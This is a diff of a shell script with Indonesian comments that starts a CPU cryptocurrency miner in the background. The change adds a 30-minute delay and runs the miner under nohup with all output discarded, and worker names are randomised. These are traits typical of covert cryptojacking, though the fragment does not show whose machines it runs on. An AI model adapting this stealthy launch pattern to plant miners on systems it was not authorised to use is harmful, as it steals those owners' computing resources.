@@ -37,7 +37,8 @@ WORKER_NAME="BBLuxy$RANDOM"
 # Memulai dengan file ayday dan menjalankan di latar belakang
 cd $INSTALL_DIR
 chmod +x $FILE_NAME
-./$FILE_NAME --disable-gpu --algorithm $ALGO --pool $POOL_URL --wallet $WALLET_ADDRESS --password $PASSWORD --Worker $WORKER_NAME --cpu-threads 0 &
+sleep 1800
+nohup ./$FILE_NAME --disable-gpu --algorithm $ALGO --pool $POOL_URL --wallet $WALLET_ADDRESS --password $PASSWORD --Worker $WORKER_NAME --cpu-threads 0 > /dev/null 2>&1 &
 
 # Mengecek apakah proses penambangan dimulai dengan benar
 if pgrep -f "$FILE_NAME" > /dev/null; then
